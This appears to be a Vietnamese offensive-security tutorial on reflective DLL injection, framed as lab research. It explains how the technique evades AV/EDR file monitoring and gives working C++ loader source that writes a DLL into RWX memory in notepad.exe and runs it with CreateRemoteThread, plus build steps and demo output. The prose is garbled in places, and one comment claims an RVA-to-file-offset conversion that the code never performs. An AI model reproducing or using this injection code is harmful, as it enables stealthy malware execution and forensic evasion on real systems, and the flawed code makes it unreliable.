
---

# 📝 [PE 06] Reflective DLL Injection (Fileless Memory Injection)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Reflective DLL Injection (Tiêm phản chiếu thư viện liên kết động)** đại diện cho một trong những giải thuật đỉnh cao thuộc nhóm kỹ thuật **Né tránh phòng thủ dựa trên tệp đĩa (Fileless / Disk Anti-Forensics)**.

Đối với các giải pháp tiêm nhiễm mô-đun truyền thống (`PE 05`), tệp tin `.dll` bắt buộc phải tồn tại vật lý trên ổ đĩa cứng, khiến hành vi này rơi vào tầm ngắm kiểm duyệt nghiêm ngặt của các cơ chế File System Minifilter Drivers lọt lòng AV/EDR. Giải thuật `Reflective` hóa giải triệt để rào cản này bằng cách **nạp, ánh xạ và thực thi mô-đun Image trực tiếp từ một mảng byte thô lưu trữ hoàn toàn trên bộ nhớ ảo (In-Memory Execution)**.

Để hiện thực hóa cơ chế này, tệp DLL tiêm nhiễm phải được lập trình cấu trúc đặc biệt: Tích hợp một hàm xuất bản (Exported Function) đóng vai trò là một **Reflective Loader** (Bộ nạp phản chiếu độc lập). Hàm này tự động đảm nhận toàn bộ vai trò, trách nhiệm của trình nạp mặc định `Windows PE Loader`, tự giải phẫu cấu trúc cấu hình và ánh xạ chính nó ngay trên không gian ảo của tiến trình đích mà không cần gọi đến hàm hệ thống `LoadLibrary`.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cơ chế trinh sát I/O**: Triệt tiêu 100% các dấu vết ghi nhật ký (Artifacts) trên đĩa cứng và các thông điệp cảnh báo sinh ra từ API `LoadLibrary`.
* **Tái dựng cấu trúc PE Loader thủ công**: Nghiên cứu và hiện thực hóa các thuật toán ánh xạ phân đoạn (Section Mapping), xử lý bảng dịch chuyển địa chỉ (Base Relocation Table) và phân giải bảng tra cứu hàm phụ thuộc (Import Address Table - IAT) ngay tại runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi hệ điều hành Windows nạp một tệp tin PE thông thường, phân hệ quản lý bộ nhớ phối hợp với Kernel để đọc tệp, phân bổ không gian ảo tương ứng và điều hướng con trỏ lệnh nhảy vào điểm `EntryPoint`. Trong giải thuật Reflective, Loader cục bộ chỉ đóng vai trò trung chuyển, ném mảng byte thô của DLL sang phân vùng mang cờ `RWX` của tiến trình đích. Cuộc đại phẫu tái cấu trúc bộ nhớ thực sự diễn ra ngầm hoàn toàn lọt lòng inside tiến trình mục tiêu thông qua hàm `ReflectiveLoader`:

```
[VirtualAllocEx: Bơm mảng byte thô sang RAM đích]
       └──> [CreateRemoteThread: Kích nổ hàm ReflectiveLoader]
                 └──> [Tự phân bổ phân vùng Image mới khít SizeOfImage]
                           └──> [Tự ánh xạ .text / .data] ──> [Tự vá cấu trúc Base Relocation & IAT]
                                     └──> [Kích nổ DllMain (DLL_PROCESS_ATTACH)]

```

1. **Định vị điểm nạp tự thân**: Ngay khi luồng CPU từ xa được kích hoạt và nhảy vào hàm `ReflectiveLoader`, hàm này thực thi một giải thuật tịnh tiến ngược bộ nhớ (Caller-hydrated Loop) để tìm kiếm Signature **`MZ` (`0x5A4D`)** của chính nó, từ đó xác định chính xác tọa độ gốc của mảng byte thô đang ký sinh trên RAM.
2. **Khởi tạo không gian Image đích**: Hàm thực hiện cuộc gọi `VirtualAlloc` nội tại ngay inside tiến trình mục tiêu để yêu cầu cấp phát một vùng không gian ảo hoàn toàn mới có kích thước vừa khít với thông số **`SizeOfImage`** được bóc tách từ cấu trúc `IMAGE_OPTIONAL_HEADER`.
3. **Ánh xạ thủ công các phân đoạn (Manual Section Mapping)**: Tự sao chép phân đoạn PE Headers sang vùng nhớ mới, sau đó duyệt qua mảng cấu trúc các Section Headers (`IMAGE_SECTION_HEADER`). Giải thuật di chuyển từng phân đoạn chức năng cốt lõi (`.text`, `.data`, `.rdata`) vào đúng tọa độ Virtual Address (RVA) chỉ định.
4. **Hiệu chỉnh bảng dịch chuyển địa chỉ (Base Relocation Table Processing)**: Do không gian ảo mới được cấp phát ngẫu nhiên bởi cơ chế ASLR, các con trỏ địa chỉ tuyệt đối gán cứng trong mã máy sẽ bị sai lệch. Hàm tiến hành giải phẫu phân đoạn `.reloc` (`IMAGE_DIRECTORY_ENTRY_BASERELOC`), tính toán khoảng sai lệch toán học (Delta) giữa địa chỉ nạp mong muốn (`ImageBase`) và địa chỉ thực tế, sau đó thực hiện phép toán cộng bổ sửa trực tiếp vào từng ô nhớ lệnh CPU.
5. **Phân giải bảng tra cứu hàm phụ thuộc (IAT Resolution)**: Duyệt cấu trúc `IMAGE_DIRECTORY_ENTRY_IMPORT` để bóc tách danh sách các thư viện DLL phụ thuộc. Hàm tự động thực hiện cơ chế PEB Walk ngầm để trích xuất địa chỉ hàm hệ thống, điền thẳng vào bảng Import Address Table (IAT) của chính nó nhằm hợp thức hóa các lệnh gọi API.
6. **Kích nổ linh hồn Mô-đun**: Hoàn tất ma trận nạp, hàm tính toán tọa độ điểm nạp và trỏ thẳng con trỏ lệnh nhảy vào điểm **`DllMain`** của DLL với tham số cấu hình `DLL_PROCESS_ATTACH`, chính thức đưa mô-đun đi vào chu kỳ sống fileless hoàn hảo.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn Loader tuân thủ nghiêm ngặt nguyên lý thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa đo đạc và đọc tệp nhị phân từ bộ đệm động nhằm triệt tiêu hoàn toàn các chỉ dấu chữ ký tĩnh trên RAM.

### 💻 Phần 1: Mã nguồn của tệp thực thi nạp (Loader.exe)

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { 
                processID = pe32.th32ProcessID; 
                break; 
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

// Hàm giải phẫu tệp tin PE: Trích xuất tọa độ Offset của hàm ReflectiveLoader từ cấu trúc file đĩa thô
DWORD GetReflectiveLoaderOffset(LPVOID lpFileBuffer) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)lpFileBuffer + dosHeader->e_lfanew);
    
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)lpFileBuffer + exportDir.VirtualAddress);

    DWORD* pdwNames = (DWORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfNames);
    DWORD* pdwFuncs = (DWORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfFunctions);
    WORD* pwOrdinals = (WORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)((DWORD_PTR)lpFileBuffer + pdwNames[i]);
        // Săn tìm chính xác hàm xuất bản mang tên định danh cấu trúc ReflectiveLoader
        if (strcmp(szName, "ReflectiveLoader") == 0) {
            DWORD functionRva = pdwFuncs[pwOrdinals[i]];
            // Chuyển đổi giá trị RVA sang File Offset toán học phục vụ ánh xạ thủ công từ xa
            return functionRva; 
        }
    }
    return 0;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 06: REFLECTIVE DLL INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) return EXIT_FAILURE;

    // Đọc file DLL phản chiếu từ đĩa vào mảng byte RAM cục bộ (Mô phỏng cơ chế Fileless nhận qua luồng mạng)
    std::string dllPath = "Reflective_Payload.dll";
    std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return EXIT_FAILURE;

    SIZE_T dllSize = file.tellg();
    std::vector<char> dllBuffer(dllSize);
    file.seekg(0, std::ios::beg);
    file.read(dllBuffer.data(), dllSize);
    file.close();

    // Trích xuất tọa độ tương đối thực tế của hàm nạp phản chiếu inside lòng tệp nhị phân
    DWORD reflectiveLoaderOffset = GetReflectiveLoaderOffset(dllBuffer.data());
    if (reflectiveLoaderOffset == 0) return EXIT_FAILURE;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // CẤP PHÁT ĐỘNG THÍCH ỨNG: Đẩy toàn bộ mảng byte thô của DLL sang phân vùng nhớ từ xa mang cờ RWX
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteBuffer, dllBuffer.data(), dllSize, NULL);
    std::cout << "[+] Da thiet lạp va day mang byte DLL thon thuc vao RAM Notepad tai: 0x" << std::hex << remoteBuffer << std::endl;

    // Tính toán tọa độ ô nhớ tuyệt đối sống của hàm ReflectiveLoader chéo tiến trình mục tiêu
    LPTHREAD_START_ROUTINE remoteLoaderAddress = (LPTHREAD_START_ROUTINE)((DWORD_PTR)remoteBuffer + reflectiveLoaderOffset);
    std::cout << "[*] Toa do diem nap tu phan chieu khai hoa: 0x" << std::hex << (PVOID)remoteLoaderAddress << std::endl;

    // Kích nổ luồng CPU từ xa đâm thẳng vào điểm nạp tự thân để mô-đun tự cấu trúc bản đồ bộ nhớ
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread de hoan tat quy trinh..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, remoteLoaderAddress, NULL, 0, NULL);
    
    if (hThread) {
        // Đồng bộ hóa luồng nhằm gánh dứt điểm luồng thực thi an toàn
        WaitForSingleObject(hThread, INFINITE); 
        std::cout << "[+] Reflective DLL Injection Completed Successfully!" << std::endl;
        CloseHandle(hThread);
    }
    
    CloseHandle(hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc file thực thi Loader cùng tệp nhị phân Reflective DLL đạt trạng thái phẳng sạch, độc lập tuyệt đối khi triển khai trên các hệ thống máy ảo cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình dự án ở chính xác chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số `Runtime Library`, chuyển cấu hình sang định dạng **`Multi-threaded (/MT)`** để nhúng tĩnh (Static Linkage) toàn bộ thư viện liên kết hệ thống vào lòng tệp chạy.

> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
> 

3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi file dự án để theo dõi cuộc đại phẫu bộ nhớ ảo:

```powershell
PS C:\Workspace\x64\Release> .\PE06_Reflective_DLL_Injection.exe
====================================================
[*] PE 06: REFLECTIVE DLL INJECTION REMOTE
====================================================
[+] Da day mang byte DLL thon thuc vao RAM Notepad tai: 0x0000021A4B9F0000
[*] Tọa do điểm nạp tu phan chieu khai hoa: 0x0000021A4B9F14D0
[*] Dang khoi tao luong CreateRemoteThread de hoan tat quy trinh...
[+] Reflective DLL Injection Completed Successfully!

```

> **Vị trí đặt ảnh minh chứng thực nghiệm Fileless Injection:**
> 

### 🎯 Phân tích hệ quả cấu trúc RAM tối cao:

* Kích hoạt logic thành công, ứng dụng Máy tính **`calc.exe` bật bung mở ra hiên ngang rực rỡ kịch trần kịch khung**!
* Tại thời điểm runtime này, nếu Blue Team sử dụng các công cụ theo dõi ghi nhận tệp tin cấp thấp (như `Procmon`), hệ thống sẽ hoàn toàn **không ghi nhận bất kỳ sự kiện nạp tệp tin DLL nào từ đĩa cứng (Disk I/O)** liên quan đến `Reflective_Payload.dll`. Thư viện đã tự nạp, tự vá cấu trúc và vận hành phẳng sạch lọt lòng inside RAM một cách vô ảnh vô hình, đánh dấu cột mốc làm chủ kỹ thuật Fileless kịch trần công nghệ!

---